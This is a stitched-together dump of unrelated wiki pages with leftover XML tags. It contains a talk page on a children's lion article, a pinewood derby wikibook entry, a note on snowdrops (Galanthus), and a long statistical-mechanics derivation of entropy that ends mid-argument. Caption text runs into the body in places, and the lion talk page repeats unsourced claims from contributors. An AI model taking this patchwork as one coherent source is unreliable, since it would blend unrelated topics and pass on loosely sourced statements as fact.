''What do lions eat, and how do they catch their prey?''
 
''A lioness tries to move a buffaloLions mostly eat other large mammals like zebra, gazelle, and wild pigs. Lions live and hunt in groups called &quot;prides&quot;. '''The female lions do most of the hunting, the males' main duty being defending the pride.''' Lionesses will also hunt alone, depending on the area they are in and what kind of game is available.''

''How do lions raise their young?''
 
''A lioness with cubsThe lion cubs are raised in prides which are family groups of related female lions, their cubs (both male and female), and an unrelated male, who fathers the cubs. (In fact, Lions are unique among the big cats in that adult males and females live together the whole year round.) '''The female lions do most of the hunting, bringing back meat for the pride's cubs, while the male lion defends the pride's territory from other lions.''' When a younger male lion is fully grown, he usually has to leave the pride, though once in a while they can take over their own pride.''

You need to choose one place to put this information. I think when you read this then read the same information again you are not learning it any better.

== Cool Facts ==

I think that the second sentence, about being one of the few cats that can roar, is very cool. I would put this into the cool facts section because I didn't know that before. Also, I like the cool facts because they make the story more interesting.

:[[User:Hdavis|Hdavis]]

== Picturing the Lions ==

I find it hard to picture the lions with only the provided measurements. I would put in some pictures so as to help visualize what the lions actually look like. I would insert two pictures side by side of a male and female lion to see how they differ in size and looks.

== References to my contribution ==

    * The lion's diet consists of a variety of meats, from small insects to large herbivores such as giraffes.

Just in case anyone is wondering where I got it from. --[[User:Dragontamer|Dragontamer]] 03:13, 7 December 2005 (UTC)

== Is pride being used incorrectly? ==

I'm no animal expert, but I thought pride means just simply; a group of lions with connotations similar to a family of people. But I see it being used in the place of &quot;group&quot;. Perhaps we should ask an animal expert whether a pride is a group of closely related lions (like an ant nest, or family of people) or connotates crowd (5 people who happen to be walking down the street at the same time). Obviously, lets not edit in this difference, I just wanna know if we are using the word correctly :)

:Pride is a social group of lions that is held together by a matriarchy but dominated for a few years at a time by a coalition of one or more male lions who father all the offspring in the pride and are eventually driven out by rogue lions (lions without a pride).  Females usually (but not always) stay with their birth pride, even after a male is deposed.  There are special relationships in which a particular female and male have a deep bond and the female, referred to as a &quot;Lion Queen&quot; will leave with the male.  The most dominant male in a lion coalition is called a &quot;Lion King.&quot;  That term actually did not originate with the Disney movie. It is not right to use the term &quot;pride&quot; as a synonym for &quot;group&quot; where lions are concerned.  It is, however, the case that lions will not go hunting with other lions that are not in their social group, so a hunting group is almost always from one pride.  HOWEVER to muck it all up, one pride of lions may break into more than one group to go hunting.  If so, they are hunting groups but not prides.

==Editing==
I have done some major editing on the lion section to make it flow a bit better. The section headings need to be changed though. [[User:Bvcxz|Bvcxz]] 03:45, 17 December 2005 (UTC)

==How lions hunt==

There were a couple inaccuracies here which I tried to clean up.  First of all, lions do not &quot;use&quot; their fur as camouflage.  Lions have no choice in the color of their fur.  It is more accurate to say that their coat colors ''provide'' camouflage and then to define, in simple terms, the word &quot;camouflage&quot;.

Similarly, lions do not hunt at night because the night somehow &quot;helps&quot; their camouflage.  They hunt at night because, being nocturnal creatures, they have excellent night vision while other creatures do not.  So I have also provided a simple description of the meaning of &quot;nocturnal&quot;.

I added the detail that the females in a pride tend to be closely related to one another, being sisters and daughters.  Even young children can understand these types of relationship and it is a much more significant and predominating relationship than that of the few adult males in a pride.

Males may be stronger than females and do keep marauders such as hyenas away from the cubs.  But their most common &quot;enemies&quot; are simply other male lions.  I don't think it necessary to tell young school children that the male lions who take over a pride kill of all the cubs and young males.  But if we, as adult contributors, keep this reality in mind, it may keep us from over-sentimentalizing and anthroprmorphizing these incredible creatures.

I'm not trying to be pedantic about these things but scientific comprehension of the natural world is abysmally low among our young students.  I'm just trying to help out where I can.  I recognize that it is usually easier to edit than it is to come up with the starting materials.  [[User:Ande B.|Ande]] 05:00, 8 April 2006 (UTC)

== Comment == 
this is a good site i would recamend it alot .....hi.............. if you have any more information on lions that is not wrighten here. i hope you email me alot....

== A few figure changes ==

I've always heard the age that cubs are ousted from a pride to be 18 months, which would be one and a half years. Also, when discussing the weight of lions there is a comparison to the weight of men.

      <text xml:space="preserve">{{How To Build a Pinewood Derby Car/Table of Contents}}
The [[w:pinewood derby|pinewood derby]] is an annual event of the [[w:Cub Scouts (Boy Scouts of America)|Cub Scouts]] (the young-age division of the [[w:|Boy Scouts of America]]). It is the most popular event for many Scouts and is probably the best known Scouting event among non-Scouts. Other groups and organizations, such as [[w:awana|Awana]], and civic clubs also host pine car races under different names.

==The Event==
[[Image:Track Pinewood Derby.jpg|left|thumb|250 px|Pinewood derby track]]
The Scout is given a block of wood made of pine with two notches for wheels, four plastic wheels and four nails. The finished car must use all nine pieces, must not exceed a certain weight (usually five ounces), must not exceed a certain length and must fit on the track used by that particular scout pack. The parent, usually the father, but occasionally the mother or grandparent often spends substantial time &quot;helping&quot; the child design, carve, paint, add weights, and tune the final car.  Judging often goes to the best looking car, but sometimes is awarded to a car that looks like it was assembled by an elementary school child.

Other than the previous basic design rules, the Cub Scout is able to carve and decorate the car as he chooses. Many Cub Scouts also add weights to the final design to bring the car to the maximum allowable weight. Cars typically vary from unfinished blocks to whimsical objects, to accurate replicas of actual cars. The fastest cars tend to resemble low doorstops, with weight at the rear. Graphite is usually the only lubricant allowed, as it often helps to polish the provided nails.

The track usually has three or four lanes and slopes down to the ground as the cars are powered by gravity. Tracks may be owned by the pack, or rented. The race is run in heats, giving every car the chance to run on each lane. The racers can be grouped with others from the same rank (Tiger Cubs, Wolf Cubs, Bear Cubs, etc.), or can compete against the pack as a whole.

The first, second, and third place winners usually receive ribbons, medals or trophies. Some packs also award on the basis of car design. The first place race winners get to go on to race first place race winners from the entire district, then each of the district-wide race winners get to race each other from across the entire council.

==History==
Cubmaster [[w:Don Murphy (Cubmaster)|Don Murphy]] organized the first pinewood derby, which was raced on May 15, 1953 in Manhattan Beach, California, by Pack 280C. Murphy's son was too young to participate in the popular [[w:Soap Box Derby|Soap Box Derby]] races, so he came up with the idea of racing miniature wood cars.  The cars had the same gravity-powered concept as the full-size Soap Box Derby cars, but were much smaller and easier to build.

In the 1980s, the design of the block was changed from a cutout block, consistent with a 1940's style front-engined [[w:Indy 500|Indy 500]] car, to a solid block. The tires were also changed from narrow, hard plastic, to wider flat-bottomed wheels. Blocks can be [[w:whittling|whittled]] with a hand knife, but this is considered dangerous for young boys. It is usually better for a trained adult to use a [[w:band saw|band saw]] or [[w:Dremel|Dremel]] carving tool for major shaping. [[w:decal|Decals]] can be bought at scout shops or hobby shops. The original style is based on open wheel cars, however, fender or body kits are available, or wheels can simply be placed outboard of the body.

Since 1953, millions of young people have built pinewood derby cars.  The competitive pinewood derby races, which were the subject of the 2005 motion picture ''[[w:Down and Derby|Down and Derby]]'', remain very popular and are a highlight of each year in many Cub Scout packs. Similar racing activities are the [[w:raingutter regatta|raingutter regatta]] with boats, and a rubber band powered rocket race, or space derby.

==Races in Canada==
In Canada, the equivalent is the '''kub kar''', raced by Cubs.  It uses the same basic pine block, nails, and plastic wheels kit.  There are similar restrictions and guidelines for both construction and racing. A kub kar event could also include other activities such as: rolling the car along the floor along a pre-determined path, trying to roll the car as close as possible to a target, knocking over targets, trying to pass through different sized holes, etc. Typically, a rally will also include various awards to reward some of the Cubs for their designing skills. While kub kars are very popular among the 8-10 year olds, younger members of Scouting can try &quot;Beaver Buggies&quot; while the older members can make and race [[w:pickup truck|pickup truck]]s and [[w:semi-trailer truck|18-wheelers]].

== Other pine car races==
Strictly speaking, only the Boy Scouts of America can organize a pinewood derby.  But many other organizations hold similar functions using different names and slightly different cars.  They all involve a basic pine wood block, plastic wheels, and basic axles.

* [[w:YMCA|YMCA]] ran their pinewood derby soon after [[w:Don Murphy (Cubmaster)|Don Murphy]] ran the first pinewood derby.
* [[w:awana|Awana]] (a religious organization for young people, which is popular in many churches) organizes pine wood car races each year using the name ''Awana Grand Prix''.
* [[w:Christian Service Brigade|Christian Service Brigade]] organizes pine car races using the name ''[http://www.shapenrace.com Shape N Race Derby]''.
* Other groups organizing similar races under a variety of names include [[w:Royal Rangers|Royal Rangers]] (an [[w:Assemblies of God|Assemblies of God]] organization), and [[w:Royal Ambassadors|Royal Ambassadors]] (a [[w:Southern Baptist Convention|Southern Baptist]] organization).
* The Woodcar Independent Racing League [[w:WIRL|WIRL]] was the first national organization formed to promote the sport of pinewood derby racing for all ages.</text>

'''''Galanthus''''' is a small genus of perennial bulbs in the Amaryllis family. ''[[../Galanthus nivalis/]]'' is the most well know species, but others are in cultivation, particularly by collectors.

==Description==
All species of ''Galanthus'' have bulbs, linear leaves, and erect flowering stalks, destitute of leaves but bearing at the top a solitary pendulous bell-shaped flower. ''Galanthus nivalis'' grows 15&amp;nbsp;cm tall, flowering in January or February in the northern temperate zone. The white flower has six petals, the outer three segments being larger and more convex than the inner series. The six anthers open by pores or short slits. The ovary is three-celled, ripening into a three-celled capsule. 

The Snowflakes, (''[[../Leucojum/]]'' spp.); are similar, but much larger and flower in late spring (or early summer, depending on the species), with the petals and sepals of the same length, though it should be noted that some &quot;poculiform&quot; (slipper-shaped) ''Galanthus'' can have inner segments similar in length to the outer ones. 

==Growing Conditions==
Moist bet well-drained, humus-rich soils. Grows in part shade to dense shade.

==Uses==
Used for naturalizing, lawn plantings, and under trees.

Celebrated as a sign of spring, snowdrops can form impressive carpets of white in areas where they are native or have been naturalised. These displays may attract large numbers of sightseers. Several gardens in the [[British Isles]] open specially in February for visitors to admire the flowers. Sixty gardens took part in Scotland's first Snowdrop Festival (1 Feb–11 March 2007). &lt;ref&gt; {{cite web |url= http://white.visitscotland.com/snowdrops/ |title=VisitScotland.com: Snowdrop Festival |accessdate= |accessdaymonth =11 March |accessyear=2007 }}&lt;/ref&gt;

      <comment>/* The Second Law */</comment>
      <text xml:space="preserve">In textbooks of thermodynamics the function of state ‘ENTROPY’ can be approached from first principles, making the study of thermodynamics well accessible.

==Considerations==
In this discussion we will take a closer look at the definition of entropy and the Second Law of Thermodynamics. In ''classical thermodynamics'' the entropy is introduced as follows: For any physical system a function of state, ''S'', exists, called “entropy”. For homogeneous closed systems it increases, after a small heat supply δ''Q'' at a system temperature ''T'', according to

:&lt;math&gt;\mathrm{d}S=\frac{\delta Q}{T}&lt;/math&gt;...............................(1)

noting that δ''Q'' is an inexact differential. The entropy is a state function and d''S'' is an exact differential. For non-homogenous systems the entropy is the sum of the entropies of the various subsystems.

Here we will follow an approach along the lines of the ''statistical thermodynamics''. It involves wave mechanics and is known as Boltzmann’s statistical approach. In the next paragraphs we will introduce entropy, almost without mathematics. It will be shown that this definition is in accordance with the classical one, given above, and a link to the following chapters of thermodynamics is made.

This introduction begins with the discussion of ‘quantum states’.&lt;br&gt;

==The Existence Of Quantum States==

Functions such as temperature, pressure, volume, the content of matter and so on, characterise the ‘state’ of a physical system. For all common experiments the value of these ‘functions of state’ is remaining constant in equilibrium, although on an atomic scale the situation is changing perpetually. For instance in a gas, after each collision of atoms, a new situation is originated without any change of temperature, pressure or volume, giving rise to a long sequence of different ‘states’. For further discussion we will call these states envisaging atomic motion: ‘microstates’, applying the term ‘macrostates’ to the mentioned state, being defined with its temperature, volume, pressure and so on.&lt;br&gt;
Taking the line of classical mechanics, the number of microstates in a gas is not well-defined: say, any atom in a box, moving along the x-coordinate from: x&lt;sub&gt;0&lt;/sub&gt; to x&lt;sub&gt;E&lt;/sub&gt;, can have velocity v. This v can have an unlimited number of values, likewise at a definite moment the atoms  location can be anywhere between: x&lt;sub&gt;0&lt;/sub&gt; and x&lt;sub&gt;E&lt;/sub&gt;. Consequently in classical mechanics the moving atom could be in an undefined number of possible ‘microstates’. &lt;br&gt; 
However, in the early twentieth century, with the rise of quantum physics this view on mechanics appeared to be too simple. The conclusion has been that the number of microstates in any physical system is well-defined, this number may be large, very large, but not infinite. &lt;br&gt;
In this new theory, the discrete microstates are called ‘quantum states’.

===Quantum mechanics===
The word quantum originates from a conclusion Max Planck has drawn about the character of light. In the nineteenth century, the wave-theory of light was generally accepted since it could encompass &quot;all&quot; experimental facts.
Nevertheless, in 1900, Planck arrived at experimental facts not compatible with the wave-theory when he was studying radiation as emitted by &quot;black bodies&quot; and the frequency distribution of this radiation. He was forced to the conclusion that the radiation-energy of black bodies exists in discrete quantities, &quot;wave-parcels&quot; (&quot;quanta&quot;). Not only the black body radiation, but all light and other electromagnetic radiation appeared to consist of such wave-parcels, being both particle and wave. &lt;br&gt;
This view has set in motion a train of considerations; in the years from 1900 up to 1930 a complete new physics has been developed. &lt;br&gt;
The classical concept of atoms as miniature billiard-balls appeared to be untenable; atoms turned out to have in many respects the character of wave-parcels analogous to light quanta. &lt;br&gt;
In the old physics, as based on classical (Newtonian) mechanics, any object can be taken at hand to observe its dimension, weight, and other properties. Its motion is a notion quite apart from these properties. &lt;br&gt;
Waves, on the contrary, do not exist without their motion; in quantum mechanics the existence and the motion of a particle are connected aspects of the same thing. &lt;br&gt;
Obviously, after centuries of successful application of classical mechanics, the conclusion that it is considered to be obsolete and must be replaced by a fairly &quot;absurd&quot; type of mechanics has met with doubts in the scientific community. Fortunately, the results of quantum mechanics and classical mechanics appear to be corresponding mutual in many cases. Especially in systems of common proportions at normal temperatures, the results of both theories agree. This conclusion, leaving preceding results of classical mechanics fully intact, is called the correspondence principle’’.

===Freely moving atoms===
In those cases where the results of classical and wave mechanics are corresponding closely, one can freely choose to apply one of  both theories on the same object, but in such cases where  both theories give different results, the line of quantum mechanics is to be preferred. &lt;br&gt;
As an illustration one can consider the most simple case, atoms moving in one dimension between two walls. In figure 1 can be seen that in this case the difference between both points of view is very large.
From the point of view of classical mechanics an atom, moving up and down between the two walls, can be at any level ''x'' and have any velocity ''v'' and consequently the number of different ’states’ would be undefined. On the other hand in quantum mechanics, dealing with standing waves only, the number of possible states is well-defined, states in between being impossible. 
---- 
[[Image:Fig1C.jpg]]&lt;br&gt;
Figure 1. &lt;big&gt;Atoms moving freely in one dimension, as considered classically and wave-mechanically.&lt;/big&gt;&lt;br&gt;
&lt;small&gt;Both pictures represent a vision on atoms, moving in one dimension between two walls. In classical mechanics the atoms are represented by miniature billiard balls, while in wave mechanics the same atoms are represented by standing waves. In the second case the number of ‘states’ is well-defined, in the first case it is not. &lt;/small&gt;
----
Consequently for the study of microstates we have to resort to quantum mechanics. In the present case the mentioned standing waves are characterised with a wave number n, being a nonzero, whole number. Each of the wave patterns is coupled to its characteristic energy, being proportional to: ''n''&lt;sup&gt;2&lt;/sup&gt;. (In classical mechanics the energy would be proportional to ''v''&lt;sup&gt;2&lt;/sup&gt;) &lt;br&gt;
The pattern of standing waves of one particle in one dimension may be very simple, a particle in three dimensions has already a more complicated wave pattern, characterised by three quantum numbers, for instance the numbers: ''n''&lt;sub&gt;x&lt;/sub&gt;, ''n''&lt;sub&gt;y&lt;/sub&gt;, and ''n''&lt;sub&gt;z&lt;/sub&gt; in x-y-z space. When the particle is moving in a cubic vessel this three-dimensional wave pattern is coupled to an energy level, proportional to: 
&lt;math&gt;(n_x^2+n_y^2+ n_z^2)&lt;/math&gt;. &lt;br&gt;
Obviously, a system with more than one particle, moving independently in a three dimensional volume exhibits still more complicated wave patterns and when the atoms are not free, but touching each other in liquids or in crystals, a still more complicated pattern of concerted waves exists, always well-defined. &lt;br&gt;

==The Number Of Quantum States And Entropy==

Mathematically the quantum number n has no upper limit, but since in real systems energy has always its upper limit, the magnitude of the quantum numbers has its upper limit likewise.&lt;br&gt;
When for instance we suppose the upper limit of the quantum number to be: ''n'' = 10, the number of possible wave patterns with one-dimensional motion would be ten likewise. For one particle with three dimensional motion the number of wave patterns would become one thousand and for two particles in the same volume, it is a million. In this line of reasoning, for a common system with N particles in three dimensions, the number of possible wave patterns would become: &lt;math&gt;10^{3N}&lt;/math&gt;, which is very large and always well defined. &lt;br&gt;
For real systems, as worked with in laboratory and in technical contexts, this calculation is not simple: the upper limit of the quantum numbers is always much greater than 10 and moreover, the number of particles (atoms) is generally large, more than &lt;math&gt;10^{20}&lt;/math&gt;. &lt;br&gt;
Nevertheless the calculation is possible: already in 1916 Sackur and Tetrode developed a sophisticated formula to calculate the number of quantum states available in an ideal gas, supposing all atoms to be moving independently from each other in a well defined volume (see [[w:Sackur-Tetrode equation]]), an important  expression of wave mechanics. The formula implies relevant corrections, the most important being a strict discrimination between identical and different atoms, present in the system. When two different atoms are interchanged, a new quantum state is brought about, but this is not the case when two identical atoms are interchanged.&lt;br&gt;
&lt;small&gt;(This strict discrimination brings about the phenomenon of ‘mixing entropy’, eliminating a contradiction,  existing in classical thermodynamics, called: the ‘Gibbs’ paradox’.)&lt;/small&gt;&lt;br&gt;

The result of calculations with the Sackur-Tetrode formula is remarkable: e.g. in 1 mole of argon, at a temperature of  300 K and a pressure of 1 bar (approaching closely the ‘ideal gas’), the number of ‘available’ quantum states turns out to be: &lt;br&gt;              &lt;math&gt;g=10^{4,870000,000000,000000,000000}&lt;/math&gt;. Very much indeed, but not infinite. &lt;br&gt;                                                      
Numbers of this size quite surpass our understanding, and are difficult to manage for any calculation. For calculations it would be sufficient to take to the exponent: &lt;math&gt;4.87\cdot 10^{24}&lt;/math&gt;, being the ‘logarithm’ of ''g'' (in formula: log(''g'')) and to multiply it with a suitable small factor. In thermodynamics this is common practice, while for convenience the ‘natural logarithm’ (ln(g)) is chosen, which is about 2.3 times as large as the mentioned log(''g''). &lt;br&gt;
The number, ‘tamed’ in this way is called ‘entropy’, indicated with the symbol ''S'', in formula: &lt;br&gt; 
&lt;math&gt;S=k\cdot\ln g&lt;/math&gt;&lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . &lt;/big&gt; (2)&lt;br&gt;
The mentioned ‘suitable’ factor ''k'' is always the ‘Boltzmann constant’, sizing: &lt;br&gt; &lt;math&gt;k=1.38\cdot 10^{-23}&lt;/math&gt; J/K.

In words: entropy is a representation of the number of quantum states. With the formula (2), the entropy of the mentioned 1 mole of argon at 300 K and 1 bar can now be calculated to be: 
''S''&lt;sub&gt;argon&lt;/sub&gt; = 155 J/(molK)&lt;br&gt;

==The Second Law==

The number of quantum states plays an important role in the settlement of physical equilibrium, for instance the cooling down of a cup of tea, the fading out of a flywheel’s rotation etc. 
These numbers of quantum states being very large in physical systems, brings about that any difference between two macrostates of the same system is generally coupled with a correspondingly large disparity of those numbers.&lt;br&gt;
An example is a system with two parts at different temperatures moving spontaneously towards equal temperatures. Think of an isolated system with two copper blocks of one mole each, beginning at the temperatures 299 K and 301 K respectively, moving to the state with both blocks at 300 K. The molar heat capacity of copper is 24.44 J/(molK).&lt;br&gt;
A relatively simple calculation shows that in the process the entropy increased with 0.00027 J/K, seeming a small increase, nevertheless being important, since it corresponds with a large disparity of the number of quantum states:  the effect of the process comes out to be an increase with the factor: 
&lt;div style=”text-align:center;”&gt;  &lt;math&gt;10^{8,500000,000000,000000}.&lt;/math&gt; &lt;/div&gt;
Energy being constant, all those quantum states have the same probability and the system will wander blindly over the enormous quantity of quantum states of both types ending up (almost) certainly in one of the quantum states of the macrostate with equal temperatures, merely driven by the large disparity of numbers. (Compare with the ‘pixel hopper’ in figure 2.) 
---- 
[[Image:Fig2E.jpg]]&lt;br&gt;
Figure 2.  &lt;big&gt;The colour-blind pixel-hopper.&lt;/big&gt; &lt;br&gt;
&lt;small&gt;This picture has been built up as a coloured area with 100 000 blue pixels and  100 red pixels. When looking sharply the reader may find in the  red area one black pixel. Supposing this to be a ‘pixel hopper’, sitting on a red pixel, we can imagine it to wander about by hopping from one (coloured) pixel to the other. All pixels having equal probability, it is obvious that, after some time, it is 1000 times more probable to find the hopper on a blue pixel than to find it on a red one. This move from red to blue can not be ascribed to a mysterious preference driving the colour-blind hopper to blue, the move is merely caused by the disparity of numbers. &lt;/small&gt; 
----
For all practical purposes any change to a macrostate with higher entropy can take place and its reverse is so improbable that we cannot expect to observe it, not even in a billion billion years. In thermodynamics we simplify the latter statement to: ‘it is impossible’. &lt;br&gt;
And: &lt;br&gt;
The entropy of an isolated system cannot decrease. This statement is the ‘second law of thermodynamics’. One consequence of this law is that a perpetual motion machine, converting heat into work with only one heat reservoir, is impossible since, withdrawing heat, would decrease the system’s entropy while the work produced, brings about no change of entropy. Another consequence is that a reversible change cannot change entropy since decrease is impossible and an increase of entropy would be transposed into a decrease after reversal.

==Entropy And Energy Balancing==

Finally it seems rather bold to nab the word entropy from the well-established classical thermodynamics, using it for a quite different notion. This cannot be done without a justification. &lt;br&gt;
For this justification must be compared the isolated systems we considered up to now with the non-isolated systems as considered in classical thermodynamics. &lt;br&gt;
In an isolated system its energy is lying between narrow limits, from: &lt;math&gt;U-\frac{1}{2}dE &lt;/math&gt; up to &lt;math&gt; U+\frac{1}{2}dE&lt;/math&gt;, taking into account that in thermodynamics dE does not approach zero as in mathematics, since the number of quantum states would approach zero likewise. In thermodynamics it is common practice to speak already of an ‘isolated system’ when dE is  small enough to make that all quantum states within the partition have (next to) the same probability. Although being non-zero, the magnitude of such a dE is small, too small to be detected calorimetrically. &lt;br&gt;  
In a non-isolated system being in contact with a heat bath exists a quite different situation: The system’s energy is fluctuating permanently. The bell-shaped curve of the probability P (see figure 3) can be thought to consist of many equivalent partitions  with a width of dE joule, while in the isolated state only one partition exists. Consequently the number of available quantum states increases considerably likewise. In a system with &lt;math&gt;10^{24}&lt;/math&gt; atoms the numbers will increase with a factor of more than &lt;math&gt;10^{12}&lt;/math&gt;, leading to a small contribution to entropy being absolutely negligible. &lt;br&gt;
It looks like a miracle:  after multiplication with a million or a billion or even a trillion the logarithm of such large numbers does not change for all practical purposes. This miracle makes that one can freely speak of ‘the’ entropy S, whether or not the system is isolated.  &lt;br&gt;

In figure 3 one can see that the system’s probability P is characterised by a bell-shaped curve, being the result of two opposing effects: the increase of the number and the decrease of their probability with increasing energy.
It can easily be calculated (see VERIFICATION below) that the level E=U at which the numbers are balancing the probabilities, is just the energy level at which the statistical approach and the classical approach agree, with the consequence that in equilibrium both approaches lead to the same result. &lt;br&gt;
So it is correct to adopt the classical name ‘entropy’ for the statistical notion as we did above.
----
[[Image:Fig3C.jpg]]&lt;br&gt;
Figure 3.  &lt;big&gt;Isolated system and a system in contact with a heat bath compared.&lt;/big&gt; &lt;br&gt; 
&lt;small&gt;In both figures the vertical coordinate is the probability of a system to be at energy level E. The left hand picture displays the situation in an ‘isolated’ system, P being unity: the system is always at the energy level U. The right hand picture gives the situation in the same system, being in equilibrium with a heat bath. Due to thermal motion its energy is fluctuating  about the mean value U. The fluctuations are so small that they can not be detected calorimetrically, but on an atomic scale they are important. &lt;br&gt; 
Two opposing trends, viz. the increase of the number of quantum states and the decrease of their probability with energy make the curve to begin increasing, while it declines at energy above U. &lt;/small&gt;
----
An interesting aspect of the fluctuating energy is the reversibility of changes within the bell-shaped probability curve. When e.g. the system did move spontaneously from level E1 to level E2 in figure 3, one can be sure to find after some time the system to be returned spontaneously to E1. &lt;big&gt;Reversible processes, playing an important role in thermodynamics are chains of such reversible changes.&lt;/big&gt;

==Verification ==

In this chapter we will justify an important statement we made above, viz. the claim that the statistical and the classical approach lead to the same entropy. &lt;br&gt;
As mentioned above one difference between classical and statistical entropy is that the latter has been defined for isolated systems, whereas classically the definition is based on its change after heat supply to a non-isolated system in contact with a heat bath. Consequently we are obliged to compare the non-isolated system with the isolated one to trace eventual agreement between the two definitions.
In contact with a heat bath the system’s energy is fluctuating permanently, due to impulses to and from atoms of the heat bath, see figure 3 above. In the figure the probability to find the system at energy level E is called P, or to be more precise: P·dE is the probability to find the system at an energy level in the interval between E and E+dE. This interval dE can be chosen to be of the same width as the interval we called above a ‘partition’, dividing up the whole function into ‘partitions’. &lt;br&gt;
As mentioned above two opposing effects are determining the probability P and cause its going up and down, as mentioned above . On one hand the number of quantum states is increasing with the energy level, while on the other hand the probability of these quantum states decreases with their energy, according to the so-called Boltzmann factor: &lt;br&gt;
&lt;math&gt;B=exp(-\frac{E-U}{kT})&lt;/math&gt;&lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (3)  &lt;br&gt;
The two effects balance each other exactly at the top, where the P-E curve is passing horizontally:&lt;br&gt;
&lt;math&gt;\frac{dP}{dE}=0&lt;/math&gt;&lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . &lt;/big&gt; (4)&lt;br&gt;
This formula is the key in comparing the statistical with the classical definition of entropy , viz. from the formula of function P, the  quotient (4) can be evaluated by differentiation, leading to the classical formula (1):&lt;br&gt;
dS =  dQ/T.&lt;br&gt;
This evaluation can be performed along the following line.
As a starting point can be taken the formula of the probability of the partition between E and E+dE:&lt;br&gt;
&lt;math&gt;P \cdot dE=g\cdot \frac{B}{Z} \cdot dE&lt;/math&gt;&lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (5)&lt;br&gt;&lt;small&gt; 
The function g being defined in the way that g·dE approaches closely 
the number of quantum states, as present between E and E+dE.
B is the Boltzmann factor and Z is the ’partition function’, which is the
normalisation factor, being necessary to achieve that the sum of all 
probabilities to be unity:  &lt;br&gt;&lt;/small&gt;
&lt;math&gt;\int_0^\infty P\cdot dE=1&lt;/math&gt;&lt;br&gt;          .
&lt;br&gt;
Differentiation of (5) leads to: &lt;br&gt;
&lt;math&gt;\frac{dP}{dE}=(\frac{dg}{dE}-\frac{g}{kT})\cdot \frac{B}{Z}&lt;/math&gt;&lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (6)&lt;br&gt;
which expression becomes zero when the factor: &lt;math&gt;(\frac{dg}{dE}-\frac{g}{kT})&lt;/math&gt; is zero. And since: &lt;math&gt;S=k\cdot \ln g&lt;/math&gt;, this implies: &lt;br&gt;
&lt;math&gt;\frac{dS}{dE}=\frac{1}{T}&lt;/math&gt; &lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . &lt;/big&gt; (7)

One consequence of this relation (7) is that the dimension of the ‘entropy unit’ must be: joule per Kelvin, J/K. &lt;br&gt;&lt;br&gt;Furthermore can be paid attention to its implication when heat is supplied reversibly to the system.

===Heat supply===

When δQ joules of heat is supplied reversibly to the system, δQ being more than one partition wide, the mean energy U will increase with:       dU = δQ.
Supposing dS/dE to be constant during the process of heat supply, we come from (7) to: &lt;br&gt;  
&lt;math&gt;dS=\frac{dS}{dE}\cdot dU=\frac{dU}{T}&lt;/math&gt; &lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . &lt;/big&gt; (8)&lt;br&gt;
and subsequently, since dU = δQ, to: &lt;br&gt;
&lt;math&gt;dS=\frac{\delta Q}{T}&lt;/math&gt;
&lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (9)&lt;br&gt;
which is identical with the classical formula (1), with the consequence: &lt;br&gt;

&lt;big&gt;Statistical entropy is identical with classical entropy.&lt;/big&gt;

==Total Differential==

After having defined entropy, formal thermodynamics and its applications can be performed as usual, considering the mathematical concept of total differentials, implying functions of more than one variable.&lt;br&gt;
&lt;small&gt;When for instance z = f(x,y) is a single-valued function of two independent variables x and y, the function can be plotted in a rectangular coordinate system, the result being a surface. The functions as considered in thermodynamics are so that this surface is always continuous and often slightly curved. Observing the motion of some point x,y on the surface, a small move can be one step dx, parallel to the YZ-coordinate plane, increasing the function z with dz, being the step in x-direction multiplied with the corresponding gradient:&lt;br&gt; &lt;math&gt;dz=(\frac{\partial z}{\partial x})_y \cdot dx&lt;/math&gt; &lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (10)&lt;br&gt;
This is called a ‘partial differential’ of the function z. When subsequently a step is made into y-direction, the corresponding increase is added, leading to:&lt;br&gt;
&lt;math&gt;dz=(\frac{\partial z}{\partial x})_y \cdot dx+(\frac{\partial z}{\partial y})_x \cdot dy&lt;/math&gt; &lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (11) &lt;br&gt;
This combined formula is the ‘total differential’ of the function z. &lt;/small&gt; &lt;br&gt;

When dQ joules of heat and dW joules of work are supplied to a physical system, the energy is increased with:&lt;br&gt;
&lt;big&gt;dU = dQ + dW  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (12)&lt;br&gt;
Since Q and W are not functions of state, (12) can not be compared with the total differential: (11), but it is possible to substitute both terms to obtain a relation with the functions of state V and S as independent variables,  approaching (11) more close. When thinking of a system consisting of a gas with volume V and pressure P, we can calculate the work to be: dW=-PdV , while formula (9) implies: dQ=TdS and substitute both in (12), with the result:&lt;br&gt;
&lt;big&gt;dU = TdS – PdV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (13)&lt;br&gt;

When two conditions are satisfied, this relation (13) would be really a total differential of the function U(S,V), firstly the volume should be kept constant during the heat supply and secondly the  entropy of the gas must remain constant during the supply of work. The first condition can be satisfied easily, while the second condition can be fulfilled likewise, viz. when for instance the concerning work comes reversibly to or from a rotating flywheel, the entropy of gas plus flywheel will be constant during this change, since gas plus flywheel together can be considered to be an isolated system. Consequently the entropy of the gas will be constant during the change of state, and the conditions to be a total differential are satisfied. So (13) can also be written as:&lt;br&gt;
&lt;math&gt;dU=(\frac{\partial U}{\partial S})_V \cdot dS+(\frac{\partial U}{\partial V})_S \cdot dV&lt;/math&gt;&lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (14) &lt;br&gt;
From this can be concluded: &lt;br&gt;
